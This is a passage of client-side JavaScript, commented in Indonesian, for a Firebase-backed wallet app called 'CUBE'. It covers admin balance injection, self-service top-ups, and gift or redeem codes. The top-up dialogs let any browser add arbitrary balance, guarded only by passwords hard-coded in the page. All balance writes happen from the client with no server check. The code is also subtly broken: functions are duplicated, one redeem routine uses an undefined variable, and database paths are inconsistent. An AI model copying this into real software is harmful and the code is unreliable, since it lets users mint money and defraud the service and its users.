
        if (cmdAction === 'add') {
            updatedBalance = currentTargetBalance + inputAmount;
            statusText = `Sukses MENAMBAHKAN saldo Rp ${inputAmount.toLocaleString('id-ID')} ke akun @${targetUser.toUpperCase()}`;
        } else {
            updatedBalance = currentTargetBalance - inputAmount;
            if(updatedBalance < 0) updatedBalance = 0; // Proteksi agar saldo tidak minus
            statusText = `Sukses MENGURANGI saldo Rp ${inputAmount.toLocaleString('id-ID')} dari akun @${targetUser.toUpperCase()}`;
        }

        // Tembak nilai baru ke database Firebase
        db.ref("cube_users/" + targetUser + "/balance").set(updatedBalance, function(error) {
            Swal.close();
            if (error) {
                ErenAlert.error("Server Error", "Gagal memperbarui data di server cloud Firebase.");
            } else {
                ErenAlert.success("Command Sukses!", statusText);
                
                // Kosongkan form input kembali
                document.getElementById('adm-cmd-text').value = "";
                document.getElementById('adm-cmd-target').value = "";
                document.getElementById('adm-cmd-amount').value = "";
                
                // Sinkronisasikan tampilan UI jika admin mengisi/mengurangi saldonya sendiri
                if (targetUser === currentUser.toLowerCase()) {
                    const hubBalanceView = document.getElementById('hub-live-balance');
                    const sidebarBalanceView = document.getElementById('sidebar-user-balance');
                    if (hubBalanceView) hubBalanceView.innerText = "Rp " + updatedBalance.toLocaleString('id-ID');
                    if (sidebarBalanceView) sidebarBalanceView.innerText = "Rp " + updatedBalance.toLocaleString('id-ID');
                }
            }
        });
    });
}

// ==========================================================================
// NEW ENGINE INJECTOR: MENANGANI PERINTAH TERMINAL "addsaldo"
// ==========================================================================
function injectSaldoByAdmin(targetUser, amountToAdd) {
    ErenAlert.loading("Menginjeksi Saldo Jaringan...");

    if (!db) {
        Swal.close();
        return ErenAlert.error("Error!", "Koneksi database tidak aktif.");
    }

    db.ref("cube_users/" + targetUser).once("value").then(snapshot => {
        if (!snapshot.exists()) {
            Swal.close();
            return ErenAlert.error("Gagal!", `Username @${targetUser.toUpperCase()} tidak ditemukan dalam sistem database cloud.`);
        }

        const currentBalance = parseInt(snapshot.val().balance || 0);
        const newBalance = currentBalance + amountToAdd;

        // Eksekusi update data tunggal ke path user target
        db.ref("cube_users/" + targetUser + "/balance").set(newBalance, function(error) {
            Swal.close();
            if (error) {
                return ErenAlert.error("Gagal Server!", "Terjadi gangguan transmisi data Firebase.");
            }

            // Bersihkan input field terminal admin
            document.getElementById('adm-cmd-text').value = "";

            // Tampilkan alert sukses manipulasi
            ErenAlert.success("Injeksi Sukses!", `Berhasil menambahkan Rp ${amountToAdd.toLocaleString('id-ID')} ke @${targetUser.toUpperCase()}.\nSaldo baru: Rp ${newBalance.toLocaleString('id-ID')}`);
            
            // Sinkronisasikan tampilan UI jika admin mengisi saldonya sendiri
            if (targetUser === currentUser.toLowerCase()) {
                const hubBalanceView = document.getElementById('hub-live-balance');
                const sidebarBalanceView = document.getElementById('sidebar-user-balance');
                if (hubBalanceView) hubBalanceView.innerText = "Rp " + newBalance.toLocaleString('id-ID');
                if (sidebarBalanceView) sidebarBalanceView.innerText = "Rp " + newBalance.toLocaleString('id-ID');
            }
        });
    }).catch(err => {
        Swal.close();
        console.error(err);
        ErenAlert.error("Error Sistem", "Gagal mengambil repositori data user.");
    });
}
// Fungsi internal khusus untuk mengeksekusi perintah terminal "addsaldo"
function injectSaldoByAdmin(targetUser, amountToAdd) {
    ErenAlert.loading("Menginjeksi Saldo Jaringan...");

    if (!db) {
        Swal.close();
        return ErenAlert.error("Error!", "Koneksi database tidak aktif.");
    }

    db.ref("cube_users/" + targetUser).once("value").then(snapshot => {
        if (!snapshot.exists()) {
            Swal.close();
            return ErenAlert.error("Gagal!", `Username @${targetUser.toUpperCase()} tidak ditemukan dalam sistem database cloud.`);
        }

        const currentBalance = parseInt(snapshot.val().balance || 0);
        const newBalance = currentBalance + amountToAdd;

        // Eksekusi update data tunggal ke path user target
        db.ref("cube_users/" + targetUser + "/balance").set(newBalance, function(error) {
            Swal.close();
            if (error) {
                return ErenAlert.error("Gagal Server!", "Terjadi gangguan transmisi data Firebase.");
            }

            // Bersihkan input field terminal admin
            document.getElementById('adm-cmd-text').value = "";

            // Tampilkan alert sukses manipulasi
            ErenAlert.success("Injeksi Sukses!", `Berhasil menambahkan Rp ${amountToAdd.toLocaleString('id-ID')} ke @${targetUser.toUpperCase()}.\nSaldo baru: Rp ${newBalance.toLocaleString('id-ID')}`);
        });
    }).catch(err => {
        Swal.close();
        console.error(err);
        ErenAlert.error("Error Sistem", "Gagal mengambil repositori data user.");
    });
}
// ==========================================================================
// QUICK INJECTOR DATABASE CONTROL (SINKRONISASI COUPLING DATABASE 2)
// ==========================================================================
function openAdminHubAddSaldo() {
    Swal.fire({
        title: 'QUICK DEPOSIT SYSTEM',
        text: 'Masukkan Username tujuan pengisian saldo cepat:',
        input: 'text',
        inputPlaceholder: 'Contoh: eren',
        showCancelButton: true,
        confirmButtonText: 'Lanjut',
        cancelButtonText: 'Batal',
        confirmButtonColor: '#00f2ea',
        background: '#111',
        color: '#fff',
        preConfirm: (username) => {
            if (!username) {
                Swal.showValidationMessage('Username target tidak boleh kosong!');
            }
            return username.trim().toLowerCase();
        }
    }).then((result) => {
        if (result.isConfirmed && result.value) {
            const targetUser = result.value;
            
            Swal.fire({
                title: 'NOMINAL DEPOSIT',
                text: `Jumlah saldo yang ingin ditambahkan ke @${targetUser.toUpperCase()}:`,
                input: 'number',
                inputPlaceholder: 'Contoh: 25000',
                showCancelButton: true,
                confirmButtonText: 'Injeksi Saldo',
                cancelButtonText: 'Batal',
                confirmButtonColor: '#00ff66',
                background: '#111',
                color: '#fff',
                preConfirm: (amount) => {
                    if (!amount || isNaN(amount) || parseInt(amount) <= 0) {
                        Swal.showValidationMessage('Nominal harus bernilai valid!');
                    }
                    return parseInt(amount);
                }
            }).then((amtResult) => {
                if (amtResult.isConfirmed && amtResult.value) {
                    ErenAlert.loading("Menginjeksi Jaringan Saldo...");
                    
                    if (!db2) {
                        Swal.close();
                        return ErenAlert.error("Error!", "Koneksi cloud database tidak terdeteksi aktif.");
                    }
                    
                    // Tarik info data user target via db2
                    db2.ref("cube_users/" + targetUser).once("value").then(snapshot => {
                        if (!snapshot.exists()) {
                            Swal.close();
                            return ErenAlert.error("Gagal!", `User @${targetUser.toUpperCase()} tidak terdaftar di sistem database.`);
                        }
                        
                        const currentBalance = parseInt(snapshot.val().balance || 0);
                        const newBalance = currentBalance + amtResult.value;
                        
                        // Eksekusi penambahan nilai database baru ke server cloud
                        db2.ref("cube_users/" + targetUser + "/balance").set(newBalance, function(error) {
                            Swal.close();
                            if (error) {
                                return ErenAlert.error("Gagal Server!", "Terjadi gangguan transmisi data Firebase.");
                            }
                            
                            ErenAlert.success("Injeksi Sukses!", `Berhasil menambahkan Rp ${amtResult.value.toLocaleString('id-ID')} ke @${targetUser.toUpperCase()}.`);
                            
                            // Jika mengisi saldo akun milik sendiri, langsung perbarui interface realtime tanpa reload halaman
                            if (targetUser === currentUser.toLowerCase()) {
                                const hubBalanceView = document.getElementById('hub-live-balance');
                                const sidebarBalanceView = document.getElementById('sidebar-user-balance');
                                if (hubBalanceView) hubBalanceView.innerText = "Rp " + newBalance.toLocaleString('id-ID');
                                if (sidebarBalanceView) sidebarBalanceView.innerText = "Rp " + newBalance.toLocaleString('id-ID');
                            }
                        });
                    }).catch(err => {
                        Swal.close();
                        ErenAlert.error("Error System", "Gagal membaca skema data cloud.");
                    });
                }
            });
        }
    });
}
// ==========================================================================
// LOGIKA SINKRONISASI SALDO UMUM & ENGINE ADD-SALDO MANDIRI INSTAN (db2)
// ==========================================================================

// =======================
// POPUP TAMBAH SALDO
// =======================

function openPublicAddSaldo() {

    // AMBIL USER LOGIN
    const senderUserRaw =
        (typeof currentUser !== 'undefined' && currentUser)
        ? currentUser
        : localStorage.getItem('cube_username');

    if (!senderUserRaw) {

        return ErenAlert.error(
            "Error!",
            "Kamu harus login terlebih dahulu."
        );

    }

    const targetUser =
        senderUserRaw.trim().toLowerCase();

    // =======================
    // INPUT NOMINAL
    // =======================

    Swal.fire({
        title: 'ISI SALDO INSTAN',
        text:
            `Masukkan jumlah saldo untuk akun @${targetUser.toUpperCase()}`,
        input: 'number',
        inputPlaceholder: 'Contoh: 50000',
        showCancelButton: true,
        confirmButtonText: 'Lanjut',
        cancelButtonText: 'Batal',
        confirmButtonColor: '#00ff66',
        background: '#111',
        color: '#fff',

        preConfirm: (amount) => {

            if (
                !amount ||
                isNaN(amount) ||
                parseInt(amount) <= 0
            ) {

                Swal.showValidationMessage(
                    'Nominal harus valid!'
                );

            }

            return parseInt(amount);

        }

    }).then((result) => {

        if (!result.isConfirmed) return;

        const nominalAmnt =
            parseInt(result.value);

        // =======================
        // INPUT PASSWORD
        // =======================

        Swal.fire({

            title: 'VERIFIKASI PASSWORD',

            text:
                `Masukkan password untuk menambahkan Rp ${nominalAmnt.toLocaleString('id-ID')}`,

            input: 'password',

            inputPlaceholder:
                'Masukkan password',

            background: '#050505',

            color: '#00f2ea',

            confirmButtonColor: '#00f2ea',

            confirmButtonText:
                'TAMBAH SALDO',

            showCancelButton: true,

            cancelButtonText: 'BATAL',

            cancelButtonColor: '#ff4444',

            preConfirm: (password) => {

                if (!password) {

                    Swal.showValidationMessage(
                        'Password wajib diisi!'
                    );

                }
                else if (
                    password !== 'agungganteng'
                ) {

                    Swal.showValidationMessage(
                        'Password salah!'
                    );

                }

                return password;

            }

        }).then((cryptoResult) => {

            if (!cryptoResult.isConfirmed) return;

            ErenAlert.loading(
                "Memproses penambahan saldo..."
            );

            // =======================
            // AMBIL DATA USER
            // =======================

            db2.ref(
                "cube_users/" + targetUser
            )
            .once("value")

            .then(snapshot => {

                if (!snapshot.exists()) {

                    Swal.close();

                    return ErenAlert.error(
                        "Error!",
                        `Akun @${targetUser} tidak ditemukan.`
                    );

                }

                const userData =
                    snapshot.val();

                const currentBalance =
                    parseInt(
                        userData.balance || 0
                    );

                const newBalance =
                    currentBalance + nominalAmnt;

                // =======================
                // UPDATE DATABASE
                // =======================

                const updates = {};

                // UPDATE BALANCE
                updates[
                    "cube_users/" +
                    targetUser +
                    "/balance"
                ] = newBalance;

                // =======================
                // HISTORY
                // =======================

                const trxId =
                    "TOPUP-" + Date.now();

                updates[
                    "cube_users/" +
                    targetUser +
                    "/history/" +
                    trxId
                ] = {

                    type: "topup",

                    amount: nominalAmnt,

                    message:
                        "Topup saldo +" +
                        "Rp " +
                        nominalAmnt.toLocaleString('id-ID'),

                    time: Date.now()

                };

                // =======================
                // NOTIFIKASI
                // =======================

                const notifId =
                    "NOTIF-" + Date.now();

                updates[
                    "cube_users/" +
                    targetUser +
                    "/notifications/" +
                    notifId
                ] = {

                    title: "Saldo Bertambah",

                    message:
                        "Saldo anda bertambah +" +
                        "Rp " +
                        nominalAmnt.toLocaleString('id-ID'),

                    type: "topup",

                    amount: nominalAmnt,

                    time: Date.now()

                };

                // =======================
                // EKSEKUSI UPDATE
                // =======================

                db2.ref()
                .update(updates)

                .then(() => {

                    Swal.close();

                    // =======================
                    // UPDATE STORAGE
                    // =======================

                    localStorage.setItem(
                        'cube_balance',
                        newBalance
                    );

                    window.currentBalance =
                        newBalance;

                    // =======================
                    // UPDATE UI
                    // =======================

                    const saldoText =
                        "Rp " +
                        newBalance.toLocaleString('id-ID');

                    [
                        "hub-live-balance",
                        "sidebar-user-balance",
                        "balance",
                        "saldo",
                        "user-balance",
                        "balanceDisplay"
                    ].forEach(id => {

                        const el =
                            document.getElementById(id);

                        if (el) {

                            el.innerText =
                                saldoText;

                        }

                    });

                    document.querySelectorAll(
                        ".saldo-text, .balance, .user-balance"
                    ).forEach(el => {

                        el.innerText =
                            saldoText;

                    });

                    // FUNCTION UPDATE
                    if (
                        typeof updateBalanceUI
                        === 'function'
                    ) {

                        updateBalanceUI(
                            newBalance
                        );

                    }

                    // LOAD NOTIF
                    if (
                        typeof loadNotifications
                        === 'function'
                    ) {

                        loadNotifications();

                    }

                    // SUCCESS
                    ErenAlert.success(

                        "Sukses!",

                        "+Rp " +
                        nominalAmnt.toLocaleString('id-ID') +
                        " berhasil ditambahkan."

                    );

                })

                .catch(error => {

                    Swal.close();

                    console.error(error);

                    ErenAlert.error(
                        "Gagal!",
                        "Gagal update saldo."
                    );

                });

            })

            .catch(err => {

                Swal.close();

                console.error(err);

                ErenAlert.error(
                    "Error Jaringan",
                    "Gagal membaca database."
                );

            });

        });

    });

}
// Variabel global untuk menampung data gambar sementara
let selectedAiImageBase64 = null;

// Fungsi untuk menangkap file gambar saat dipilih dari input file HTML
function handleAiImageSelect(input) {
    if (input.files && input.files[0]) {
        const file = input.files[0];
        
        // Proteksi ukuran maksimal 4MB agar konversi base64 lancar
        if (file.size > 4 * 1024 * 1024) {
            alert("Maksimal ukuran gambar adalah 4MB!");
            input.value = "";
            return;
        }

        const reader = new FileReader();
        reader.onload = function(e) {
            selectedAiImageBase64 = e.target.result;
            
            // Tampilkan kontainer pratinjau gambar jika ada di HTML Anda
            const previewContainer = document.getElementById('ai-image-preview-container');
            const previewImg = document.getElementById('ai-image-preview');
            if (previewContainer && previewImg) {
                previewImg.src = selectedAiImageBase64;
                previewContainer.style.display = 'flex';
            }
        };
        reader.readAsDataURL(file);
    }
}

// Fungsi membersihkan memori gambar setelah terkirim atau dibatalkan
function clearSelectedAiImage() {
    selectedAiImageBase64 = null;
    const fileInput = document.getElementById('ai-file-input');
    const previewContainer = document.getElementById('ai-image-preview-container');
    if (fileInput) fileInput.value = "";
    if (previewContainer) previewContainer.style.display = 'none';
}
function executeQuickDeposit(amount) {
    const inputAmount = parseInt(amount);
    if (isNaN(inputAmount) || inputAmount <= 0) {
        return ErenAlert.error("Gagal", "Nominal isi saldo tidak valid!");
    }

    // Ambil data session pengirim dari local storage atau variabel global
    const senderUserRaw = (typeof currentUser !== 'undefined' && currentUser) ? currentUser : localStorage.getItem('cube_username');

    if (!senderUserRaw) {
        return ErenAlert.error("Sesi Habis", "Akun tidak ditemukan di perangkat. Silakan login kembali!");
    }
    
    const senderUser = senderUserRaw.trim().toLowerCase();

    // 🟢 TAMBAHAN: Munculkan Pop-up Input Password Sebelum Proses Isi Saldo
    Swal.fire({
        title: 'VERIFIKASI KEAMANAN',
        text: `Silakan masukkan password untuk memproses isi saldo cepat sebesar Rp ${inputAmount.toLocaleString('id-ID')}`,
        input: 'password',
        inputPlaceholder: 'Masukkan password Anda',
        inputAttributes: {
            autocapitalize: 'off',
            autocorrect: 'off'
        },
        background: '#050505',
        color: '#00f2ea',
        confirmButtonColor: '#00f2ea',
        confirmButtonText: 'KONFIRMASI',
        showCancelButton: true,
        cancelButtonText: 'BATAL',
        cancelButtonColor: '#ff4444',
        preConfirm: (password) => {
            // Validasi Password wajib "cemplok"
            if (!password) {
                Swal.showValidationMessage('Password tidak boleh kosong!');
            } else if (password !== 'cemplok') {
                Swal.showValidationMessage('Password salah! Akses ditolak.');
            }
            return password;
        }
    }).then((result) => {
        // Jika user membatalkan atau password salah, hentikan proses
        if (!result.isConfirmed) return;

        // Jika password BENAR ("cemplok"), lanjutkan proses penambahan saldo ke Firebase
        ErenAlert.loading("Menghubungkan ke Cloud Sinkronisasi...");

        // Cari data akun di folder "cube_users" sesuai screenshot database Anda
        db2.ref("cube_users").once("value").then(snapshot => {
            if (!snapshot.exists()) {
                Swal.close();
                return ErenAlert.error("Error!", "Database pengguna kosong.");
            }

            let userKey = null;
            let currentBalance = 0;

            // Loop mencari kecocokan username Anda di Firebase
            snapshot.forEach(childSnapshot => {
                const userData = childSnapshot.val();
                if (userData.username && userData.username.toLowerCase() === senderUser) {
                    userKey = childSnapshot.key; // Dapatkan ID Unik (UID)
                    currentBalance = parseInt(userData.balance || 0);
                }
            });

            if (!userKey) {
                Swal.close();
                return ErenAlert.error("Error!", `Akun @${senderUser.toUpperCase()} tidak valid di server.`);
            }

            // Hitung akumulasi saldo baru
            let updatedBalance = currentBalance + inputAmount;

            // Simpan perubahan ke Firebase database di node users/ID_UNIK/balance
            db2.ref("users/" + userKey + "/balance").set(updatedBalance, function(err) {
                Swal.close();
                if (err) {
                    return ErenAlert.error("Sistem Error", "Gagal mengalokasikan saldo cepat di server.");
                }

                // Catat Log Transaksi Masuk
                const txId = "TX-DEP-" + Date.now();
                db2.ref("cube_transactions/" + txId).set({
                    tx_id: txId,
                    type: "Isi Saldo Cepat",
                    sender: "Sistem Cloud",
                    receiver: senderUser,
                    amount: inputAmount,
                    timestamp: new Date().toISOString()
                });

                // Notifikasi Sukses
                ErenAlert.success(
                    "Isi Saldo Berhasil!",
                    `Password Benar. Saldo Anda: +Rp ${inputAmount.toLocaleString('id-ID')} telah ditambahkan ke dompet digital.`
                );

                // Sinkronisasi data lokal perangkat browser
                localStorage.setItem('cube_balance', updatedBalance);

                // Sinkronisasi Realtime tampilan angka saldo di layar Hub & Sidebar tanpa refresh
                const hubBalanceView = document.getElementById('hub-live-balance');
                const sidebarBalanceView = document.getElementById('sidebar-user-balance');

                if (hubBalanceView) hubBalanceView.innerText = "Rp " + updatedBalance.toLocaleString('id-ID');
                if (sidebarBalanceView) sidebarBalanceView.innerText = "Rp " + updatedBalance.toLocaleString('id-ID');
                if (typeof updateBalanceUI === 'function') updateBalanceUI(updatedBalance);
            });

        }).catch(err => {
            Swal.close();
            console.error(err);
            ErenAlert.error("Error Jaringan", "Gagal terhubung ke database cloud CUBE.");
        });
    });
}
// ======================================================
// CREATE CODE
// ======================================================

async function createBalanceCode() {

    const nominal = parseInt(
        document.getElementById("giftNominal").value
    );

    if (!nominal || nominal < 1000) {
        return ErenAlert.error(
            "Error",
            "Minimal hadiah Rp 1.000"
        );
    }

    const username =
        localStorage.getItem("cube_username");

    if (!username) {
        return ErenAlert.error(
            "Error",
            "Silakan login ulang"
        );
    }

    try {

        ErenAlert.loading("Membuat code hadiah...");

        // Cari user
const snap = await db2.ref("cube_users").once("value");

if (!snap.exists()) {

    Swal.close();

    return ErenAlert.error(
        "Error",
        "Database user kosong"
    );
}

let userKey = null;
let userData = null;

snap.forEach(child => {
    console.log("USERNAME LOCAL:", username);
    console.log("USERNAME DATABASE:", child.val().username);

    const data = child.val();

    if (
        data.username &&
        data.username.toLowerCase().trim() ===
        username.toLowerCase().trim()
    ) {
        userKey = child.key;
        userData = data;
    }

});

if (!userKey) {

    Swal.close();

    return ErenAlert.error(
        "User Tidak Ditemukan",
        "Username akun tidak cocok dengan database."
    );
}

        const currentBalance =
            parseInt(userData.balance || 0);

        // Cek saldo
        if (currentBalance < nominal) {

            Swal.close();

            return ErenAlert.error(
                "Saldo Kurang",
                `Saldo kamu Rp ${currentBalance.toLocaleString("id-ID")}`
            );
        }

        // Potong saldo
        const newBalance =
            currentBalance - nominal;

        // Generate code random
        const code =
            "CUBE-" +
            Math.random().toString(36)
            .substring(2, 8)
            .toUpperCase();

        // Data redeem
        const redeemData = {
            code: code,
            amount: nominal,
            creator: username,
            claimed: false,
            created_at: Date.now()
        };

        // Update database
        const updates = {};

        updates[`users/${userKey}/balance`] =
            newBalance;

        updates[`cube_codes/${code}`] =
            redeemData;

        await db2.ref().update(updates);

        // Sync local
        localStorage.setItem(
            "cube_balance",
            newBalance
        );

        Swal.close();

        Swal.fire({
            title: "CODE BERHASIL DIBUAT",
            html: `
                <div style="font-size:1.5rem;
                font-family:Orbitron;
                color:#0f0;
                margin:20px 0;">
                    ${code}
                </div>

                <p>
                    Hadiah:
                    <b>Rp ${nominal.toLocaleString("id-ID")}</b>
                </p>
            `,
            background:"#050505",
            color:"#fff"
        });

    } catch(err) {

        console.error(err);

        Swal.close();

        ErenAlert.error(
            "Error",
            "Gagal membuat code"
        );
    }
}

// ======================================================
// REDEEM CODE
// ======================================================

async function redeemBalanceCode() {

    const codeInput =
        document.getElementById("redeemCodeInput")
        .value
        .trim()
        .toUpperCase();

    if (!codeInput) {

        return ErenAlert.error(
            "Error",
            "Masukkan code"
        );
    }

    const username =
        localStorage.getItem("cube_username");

    try {

        ErenAlert.loading("Menukar code...");

        // Ambil data code
        const codeSnap = await db2
            .ref("cube_codes/" + codeInput)
            .once("value");

        if (!codeSnap.exists()) {

            Swal.close();

            return ErenAlert.error(
                "Code Tidak Valid",
                "Code tidak ditemukan"
            );
        }

        const codeData = codeSnap.val();

        // Cek sudah dipakai
        if (codeData.claimed === true) {

            Swal.close();

            return ErenAlert.error(
                "Code Sudah Dipakai",
                "Redeem sudah digunakan"
            );
        }

const usersSnap = await db2
    .ref("cube_users")
    .once("value");
    console.log(
   "LOGIN SESSION:",
   localStorage.getItem("cube_username")
);

let userKey = null;
let userData = null;

usersSnap.forEach(child => {

    const dbKey =
        child.key
        .toString()
        .trim()
        .toLowerCase();

    const loginUser =
        username
        .toString()
        .trim()
        .toLowerCase();

    if (dbKey === loginUser) {

        userKey = child.key;
        userData = child.val();

    }

});

if (!userKey) {

    Swal.close();

    return ErenAlert.error(
        "Error",
        "Akun tidak ditemukan di database"
    );

}

        const currentBalance =
            parseInt(userData.balance || 0);

        const newBalance =
            currentBalance +
            parseInt(codeData.amount);

        // Update
        const updates = {};

        updates[`users/${userKey}/balance`] =
            newBalance;

        updates[`cube_codes/${codeInput}/claimed`] =
            true;

        updates[`cube_codes/${codeInput}/claimed_by`] =
            username;

        updates[`cube_codes/${codeInput}/claimed_at`] =
            Date.now();

        await db2.ref().update(updates);

        // Sync local
        localStorage.setItem(
            "cube_balance",
            newBalance
        );

        Swal.close();

        ErenAlert.success(
            "BERHASIL REDEEM",
            `Saldo bertambah Rp ${parseInt(codeData.amount).toLocaleString("id-ID")}`
        );

    } catch(err) {

        console.error(err);

        Swal.close();

        ErenAlert.error(
            "Error",
            "Gagal redeem code"
        );
    }
}

function openCreateCode() {

    Swal.fire({
        title: "BUAT CODE REDEEM",
        html: `

            <input
                type="text"
                id="customRedeemCode"
                class="swal2-input"
                placeholder="Contoh: 2026FREE"
            >

            <input
                type="number"
                id="customRedeemAmount"
                class="swal2-input"
                placeholder="Nominal saldo"
            >

        `,
        confirmButtonText: "BUAT CODE",
        background:"#050505",
        color:"#fff"

    }).then((result) => {

        if (result.isConfirmed) {
            createCustomRedeemCode();
        }

    });

}
// ======================================================
// POPUP REDEEM
// ======================================================

function openCreateCode() {

    Swal.fire({

        title: "BUAT CODE REDEEM",

        html: `

            <input
                type="text"
                id="customRedeemCode"
                class="swal2-input"
                placeholder="Contoh: 2026FREE"
            >

            <input
                type="number"
                id="customRedeemAmount"
                class="swal2-input"
                placeholder="Nominal saldo"
            >

        `,

        confirmButtonText: "BUAT CODE",
        background:"#050505",
        color:"#fff",
        confirmButtonColor:"#00ff66"

    }).then((result) => {

        if (result.isConfirmed) {
            createCustomRedeemCode();
        }

    });

}



function openRedeemCode() {

    Swal.fire({

        title: "TUKAR CODE",

        html: `

            <input
                type="text"
                id="redeemCodeInput"
                class="swal2-input"
                placeholder="Masukkan code redeem"
            >

        `,

        confirmButtonText: "REDEEM",
        background:"#050505",
        color:"#fff",
        confirmButtonColor:"#00f2ea"

    }).then((result) => {

        if (result.isConfirmed) {
            redeemBalanceCode();
        }

    });

}



async function createCustomRedeemCode() {

    const code = document
        .getElementById("customRedeemCode")
        .value
        .trim()
        .toUpperCase();

    const amount = parseInt(
        document
        .getElementById("customRedeemAmount")
        .value
    );

    // VALIDASI
    if (!code) {

        return ErenAlert.error(
            "Error",
            "Masukkan code redeem"
        );

    }

    if (!amount || amount < 1000) {

        return ErenAlert.error(
            "Error",
            "Minimal Rp 1.000"
        );

    }

    try {

        ErenAlert.loading(
            "Membuat code redeem..."
        );

        // USER LOGIN
        let username =
            localStorage.getItem(
                "cube_username"
            );

        if (!username) {

            Swal.close();

            return ErenAlert.error(
                "Error",
                "Session login hilang"
            );

        }

        username = username
            .trim()
            .toLowerCase();

        console.log(
            "USERNAME LOGIN:",
            username
        );

        // AMBIL DATA USER
        const userSnap = await db2
            .ref("cube_users")
            .child(username)
            .once("value");

        console.log(
            "USER EXISTS:",
            userSnap.exists()
        );

        if (!userSnap.exists()) {

            Swal.close();

            return ErenAlert.error(
                "Error",
                "Akun tidak ditemukan di database"
            );

        }
        const userData =
            userSnap.val();
        const currentBalance =
            parseInt(
                userData.balance || 0
            );

        // CEK SALDO
        if (currentBalance < amount) {

            Swal.close();

            return ErenAlert.error(
                "Saldo Kurang",
                `Saldo kamu Rp ${currentBalance.toLocaleString("id-ID")}`
            );

        }

        // CEK CODE SUDAH ADA
        const codeCheck = await db2
            .ref("cube_codes")
            .child(code)
            .once("value");

        if (codeCheck.exists()) {

            Swal.close();

            return ErenAlert.error(
                "Code Sudah Ada",
                "Gunakan code lain"
            );

        }

        // SALDO BARU
        const newBalance =
            currentBalance - amount;

        // DATA CODE
        const codeData = {

            code: code,
            amount: amount,
            creator: username,
            claimed: false,
            claimed_by: null,
            created_at: Date.now()

        };

        // UPDATE DATABASE
        const updates = {};

        // POTONG SALDO
        updates[
            `cube_users/${username}/balance`
        ] = newBalance;

        // SIMPAN CODE
        updates[
            `cube_codes/${code}`
        ] = codeData;

        await db2.ref().update(updates);

        // SYNC LOCAL
        localStorage.setItem(
            "cube_balance",
            newBalance
        );

        // UPDATE UI
        const balanceView =
            document.getElementById(
                "hub-live-balance"
            );

        if (balanceView) {

            balanceView.innerText =
                "Rp " +
                newBalance.toLocaleString(
                    "id-ID"
                );

        }

        Swal.close();

        // SUKSES
        Swal.fire({

            title: "CODE BERHASIL",

            html: `

                <div style="
                    font-size:1.6rem;
                    color:#00ff66;
                    font-family:Orbitron;
                    margin:15px 0;
                    text-shadow:0 0 15px #00ff66;
                ">
                    ${code}
                </div>

                <div style="
                    color:#fff;
                    font-size:1rem;
                ">
                    Hadiah Redeem
                    <br><br>

                    <b style="
                        color:#00f2ea;
                        font-size:1.3rem;
                    ">
                        Rp ${amount.toLocaleString("id-ID")}
                    </b>

                </div>

            `,

            background:"#050505",
            color:"#fff",
            confirmButtonColor:"#00ff66"

        });

    } catch(err) {

        console.error(err);

        Swal.close();

        ErenAlert.error(
            "Error",
            "Gagal membuat code redeem"
        );

    }

}



async function redeemBalanceCode() {

    const code = document
        .getElementById("redeemCodeInput")
        .value
        .trim()
        .toUpperCase();

    if (!code) {

        return ErenAlert.error(
            "Error",
            "Masukkan code redeem"
        );

    }

    try {

        ErenAlert.loading(
            "Memproses redeem..."
        );

        let username =
            localStorage.getItem(
                "cube_username"
            );

        if (!username) {

            Swal.close();

            return ErenAlert.error(
                "Error",
                "Session login hilang"
            );

        }

        username = username
            .trim()
            .toLowerCase();

        // AMBIL USER
        const userSnap = await db2
            .ref("cube_users")
            .child(username)
            .once("value");

        if (!userSnap.exists()) {

            Swal.close();

            return ErenAlert.error(
                "Error",
                "User tidak ditemukan"
            );

        }


        const currentBalance =
            parseInt(
                userData.balance || 0
            );

        // AMBIL CODE
        const codeSnap = await db2
            .ref("cube_codes")
            .child(code)
            .once("value");

        if (!codeSnap.exists()) {

            Swal.close();

            return ErenAlert.error(
                "Code Tidak Valid",
                "Code redeem tidak ditemukan"
            );

        }

        const codeData =
            codeSnap.val();

        // SUDAH DIPAKAI?
        if (codeData.claimed) {

            Swal.close();

            return ErenAlert.error(
                "Code Sudah Dipakai",
                "Code redeem sudah digunakan"
            );

        }

        // TAMBAH SALDO
        const newBalance =
            currentBalance +
            parseInt(codeData.amount);

        const updates = {};

        // UPDATE SALDO
        updates[
            `cube_users/${username}/balance`
        ] = newBalance;

        // UPDATE CODE
        updates[
            `cube_codes/${code}/claimed`
        ] = true;

        updates[
            `cube_codes/${code}/claimed_by`
        ] = username;

        updates[
            `cube_codes/${code}/claimed_at`
        ] = Date.now();

        await db2.ref().update(updates);

        // SYNC LOCAL
        localStorage.setItem(
            "cube_balance",
            newBalance
        );

        // UPDATE UI
        const balanceView =
            document.getElementById(
                "hub-live-balance"
            );

        if (balanceView) {

            balanceView.innerText =
                "Rp " +
                newBalance.toLocaleString(
                    "id-ID"
                );

        }

        Swal.close();

        // SUKSES
        Swal.fire({

            title: "REDEEM BERHASIL",

            html: `

                <div style="
                    color:#00ff66;
                    font-size:1.5rem;
                    font-family:Orbitron;
                    margin:15px 0;
                ">
                    +Rp ${parseInt(codeData.amount)
                        .toLocaleString("id-ID")}
                </div>

                <div style="
                    color:#fff;
                ">
                    Saldo berhasil ditambahkan
                </div>

            `,

            background:"#050505",
            color:"#fff",
            confirmButtonColor:"#00f2ea"

        });

    } catch(err) {

        console.error(err);

        Swal.close();

        ErenAlert.error(
            "Error",
            "Gagal redeem code"
        );

    }

}
// Jalankan sinkronisasi nama ke sub-card dashboard
setInterval(() => {
    const currentLoggedUser = localStorage.getItem('cube_username') || "USER";
    const subDashView = document.getElementById('display-user-dash-sub');
    if (subDashView && subDashView.innerText !== currentLoggedUser.toUpperCase()) {
        subDashView.innerText = currentLoggedUser.toUpperCase();
    }
}, 1000);
// ====================================================================
// CYBERPUNK USER DETECTOR REALTIME PROCESSING SYSTEM (FIXED LENGKAP)
// ====================================================================
function startLiveUserDiagnostics() {
    if (typeof db2 === 'undefined' && typeof db === 'undefined') return;
    const firebaseDb = typeof db2 !== 'undefined' ? db2 : db;

    // Menghubungkan ke jalur database user cloud Anda secara realtime
    firebaseDb.ref("cube_users").on("value", snapshot => {
        const userGrid = document.getElementById("live-user-status-grid");
        if (!userGrid) return;
        
        if (!snapshot.exists()) {
            userGrid.innerHTML = `<div style="text-align:center; color:#ff0055; padding:15px; font-size:0.75rem; font-family:'Orbitron'; letter-spacing:1px;"><i class="fa-solid fa-triangle-exclamation"></i> ZERO NODES CONNECTED</div>`;
            return;
        }

        let htmlContent = "";
        let count = 0;
        const now = Date.now();
        const systemDefaultAvatar = "https://cdn-icons-png.flaticon.com/512/847/847969.png";

        snapshot.forEach(childSnapshot => {
